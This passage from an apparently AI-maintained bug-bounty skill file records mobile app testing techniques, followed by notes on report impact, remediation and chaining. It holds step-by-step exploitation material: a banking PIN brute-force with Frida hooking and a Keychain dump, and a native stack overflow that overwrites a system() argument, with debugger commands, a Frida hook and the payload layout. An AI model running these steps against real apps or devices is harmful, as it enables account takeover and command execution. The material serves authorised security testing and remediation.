**Where:** any banking/finance app using a short numeric PIN (4-digit is the classic case, keyspace of only 10,000 combinations) as a standalone auth factor, where SSL pinning has already been bypassed (Objection one-liner, this skill's existing coverage) and traffic is visible in Burp.

**Root cause — three compounding weaknesses, not one bug:** (1) the app hashes/encrypts the PIN client-side before it ever reaches the network, which hides the plaintext from a pure Burp-traffic view but not from runtime instrumentation; (2) the PIN-verification endpoint applies **no server-side rate limiting or lockout**, so a 10,000-value keyspace is trivially exhaustible in seconds once automatable; (3) the client-side-hashing design (same architectural smell as `session-auth-testing` entry #20's plaintext-password-leak pattern) meant the server was trusting a value the client computed, rather than independently rate-limiting and validating PIN attempts itself.

**Exploit steps:**
1. Bypass SSL pinning (Objection: `objection -g com.target.bank explore --startup-command "android sslpinning disable"`) to get a clean Burp view of the PIN-verification traffic — confirms the PIN is hashed/encrypted client-side before it's sent, which is what makes a pure traffic-capture approach insufficient on its own.
2. Attach Frida directly to the running app and hook the function that performs the PIN hashing/encryption **before** it executes, rather than trying to reverse the hash itself:
```bash
frida -U -f com.target.bank -l pin_dump.js
```
Write `pin_dump.js` to intercept the function call at the point the plaintext PIN is still an argument in memory, and log it — this is the general Frida pattern of "hook the function one step before the transformation you can't easily reverse," applicable to any client-side crypto/encoding step, not just PIN hashing specifically.
3. With the plaintext-PIN interception point now instrumented, drive a brute-force of the full 4-digit keyspace (`0000`-`9999`) through the app/API with no authentication throttling observed — confirms the server-side rate-limiting gap directly rather than inferring it.
4. Separately, dump stored credential material to check for weak-default usage at scale: iOS Keychain via `security dump-keychain` (macOS/jailbroken-device command, reads the device's or simulator's Keychain items directly), Android via ADB-pulled SharedPrefs (this skill's existing SharedPrefs coverage). The source's finding that **~7% of sampled users used a default/trivial PIN like "0000"** turned a theoretical brute-forceability finding into "a meaningful fraction of real accounts are exploitable right now" — worth quantifying similarly (ethically, on test/sampled data only) whenever a PIN/short-passcode scheme is confirmed brute-forceable.

**Impact framing for report:** don't stop at "PIN brute force is possible" — this report's escalation path (biometric-auth disablement + credential modification via the authenticated session gained from a cracked PIN) demonstrated full account takeover, and the %-of-users-using-default-PINs statistic (from safely sampled/test data, never live victim accounts) is what elevated this from a theoretical rate-limiting gap to a mass-exploitation-capable finding worth $5,000. Deliverables that strengthened the report: video PoC, a findings spreadsheet, and a regulatory-impact memo (cross-reference `bughunting-workflow` Phase 5's business-risk framing — financial/regulatory consequences are a strong severity argument for banking targets specifically).

**Generalize note:** any short, fixed-length numeric credential (4-6 digit PIN, SMS OTP already covered by `session-auth-testing` entry #21, a short alphanumeric recovery code) is a brute-forceable keyspace by definition — the only thing standing between "theoretical" and "exploited" is server-side rate limiting, and client-side hashing of the credential before transmission is never a substitute for that, since Frida-hooking the pre-hash point defeats it entirely. Cross-reference `rate-limit-bypass-testing` for the general missing-throttling methodology this finding is a mobile-specific instance of.

## Recorded technique: stack-based buffer overflow in a native `.so` reached via a JNI-exposed function, escalated to `system()`-call argument overwrite
Source: [Buffer Overflow in Android Native Code — MobileHackingLab Notekeeper Write-up](https://freedium-mirror.cfd/https://ajmalmoochingal.medium.com/buffer-overflow-in-android-native-code-mobilehackinglab-notekeeper-write-up-4e7764be3c2a)

**Where:** any Android app that ships a custom native library (`.so`) and passes attacker-controlled input (a text field, filename, note title — any Java-side string) into a JNI-exposed native function, especially one old/custom enough to do manual C-level string/buffer handling rather than calling into a vetted library.

**Root cause:** the native function copies the input onto a fixed-size stack buffer in a loop with no bounds check, so an oversized input overflows the buffer and overwrites adjacent stack memory — here, specifically the argument register/stack slot for a `system()` call the function later invokes, letting the attacker control what shell command actually gets executed.

**Exploit steps:**
1. **Crash-based discovery** — feed progressively longer strings into a text input (note title) that's known to reach native code (confirmed via Java-side method reflection showing a `native` function like `parse()`), until the app crashes with SIGSEGV. A crash is the first signal a native memory-safety bug exists at all.
2. **Reverse the native function** — pull the `.so` off the device (`adb pull`) and decompile with **Cutter** (Rizin/radare2 GUI) to read the ARM assembly of the vulnerable function; locate the unbounded copy loop and confirm it leads into a `system()` call whose argument lives in the region the overflow reaches.
3. **Live debug setup** — attach `gdbserver` on the device over `adb forward`, pulling the device's own `/system/lib64` locally first so symbol resolution works:
```bash
mkdir dbglibsso
adb pull /system/lib64 .
adb forward tcp:1337 tcp:1337
adb shell ps -a | grep <app-process>
# attach gdbserver to the PID, set breakpoints in the vulnerable function
```
4. **Find the exact overflow offset** — use `pwntools`' cyclic-pattern generator (`pwn.cyclic()`/`pwn.cyclic_find()`) to send a non-repeating byte sequence and determine precisely how many bytes of padding reach the target overwrite point (`'zaab'` → offset 100 in this case) — standard binary-exploitation offset-discovery technique, applicable to any stack-overflow regardless of platform.
5. **Confirm the overwrite target with Frida** — hook the native `system()` export directly to watch its argument change live as input length is varied, proving the overflow lands exactly where the command string is read from rather than guessing:
```javascript
let system_addr = Module.findExportByName("libc.so", "system");
Interceptor.attach(system_addr, {
  onEnter: function (args) {
    console.log("system(): ", args[0].readUtf8String())
  }
})
```
6. **Build the final payload** — `<offset bytes of padding><attacker shell command>#`: the padding fills the buffer up to the overwrite point, the attacker-controlled string becomes the new `system()` argument, and a trailing `#` comments out any leftover stack garbage the command-string parsing would otherwise choke on. Verify RCE non-destructively (`touch` a file inside the app's own data directory) rather than anything destructive.

**Impact:** full arbitrary command execution inside the app's own process/sandbox — a materially more severe finding than a typical mobile data-exposure bug, and distinct from `rce-exploitation-testing`'s web-focused SSTI/deserialization/command-injection coverage since the vulnerable code and the exploitation toolchain (Cutter, gdbserver, pwntools cyclic patterns, Frida function-argument hooking) are native-binary-specific.

**Generalize note:** this is classic stack-smashing methodology (crash → disassemble → find offset via cyclic pattern → confirm overwrite target → weaponize) applied to an Android app's bundled native library instead of a standalone ELF binary — worth running whenever static analysis (jadx) turns up a JNI/`native` method call into a custom (not a well-known vetted) `.so`, since that's exactly the kind of hand-rolled C code most likely to skip bounds checking.

## Impact framing for report

Push each finding to a concrete scenario, not just "found a hardcoded key":
- Hardcoded credentials → actual production access to the cloud resource (AWS bucket listing, Firebase read/write, Stripe API call) — demonstrate the credential works, don't just quote it.
- Mobile IDOR → viewing/modifying another user's data through the same API the app itself uses.
- Insecure local storage → what specific sensitive data was recoverable from a device (patient records, financial data, session tokens) — pull from the actual file, not a hypothetical.
- Deep link exploitation → a concrete unintended action (password reset for another account, admin action) triggered purely via `adb shell am start`, no app UI involved.
- Client-side-only premium/paywall checks → unlocking a paid feature by flipping a local boolean, demonstrating the check is enforced only client-side.
- WebView XSS via profile fields → session token theft/account takeover chain, same escalation pattern as `csp-misconfig-xss-testing`'s session-hijack chain.

## Remediation notes (for reports / retesting a fix)

- **Hardcoded secrets**: remove from code, move to secure backend config, rotate any credential that was ever committed.
- **Insecure storage**: use Android Keystore for sensitive values; encrypt local databases (e.g. SQLCipher); enforce proper file access controls.
- **Network/SSL**: implement certificate pinning, enforce HTTPS-only, require TLS 1.2+.
- **Auth**: never trust a client-side decision — validate server-side; rate-limit auth endpoints; use secure token generation with real expiration; support MFA.
- **XSS/input**: HTML-encode output in WebViews, apply CSP where applicable (cross-reference `csp-misconfig-xss-testing`), sanitize server-side.
- **Exported components**: default `android:exported="false"`; use explicit intents; validate all incoming intent data server-side-equivalent (never trust intent extras as authenticated input).

## Chaining

Apply across **Phase 1–3** of `bughunting-workflow` when a target includes a mobile app: Phase 1/2 recon should note whether an APK/IPA is in scope and pull it, Phase 3 vuln testing then works through this skill's phases A–D. Cross-reference other topic skills where the underlying issue matches: IDOR here is the same class as `http-parameter-pollution-testing`'s access-control section; WebView XSS chains the same way as `csp-misconfig-xss-testing`; a mobile-sourced credential/shell finding feeds into `post-access-impact` once you have server access.

## Sources

- [The Complete Mobile App Hacking Guide for Bug Bounty Hunters (2026 Edition)](https://medium.com/system-weakness/the-complete-mobile-app-hacking-guide-for-bug-bounty-hunters-2026-edition-962aaa6f3c3c) — processed 2026-09-22 via freedium mirror (WebFetch succeeded directly). References: OWASP Mobile Security Testing Guide, DIVA/InsecureBank/GoatDroid practice apps, Hacker101 mobile training.
- [APK Goldmine: How Reverse Engineering Reveals Hidden APIs](https://systemweakness.com/apk-goldmine-how-reverse-engineering-reveals-hidden-apis-11401562d3d0) — processed 2026-09-24 via freedium mirror.

<!-- Add new recorded techniques below this line as new mobile-testing writeups are processed. -->
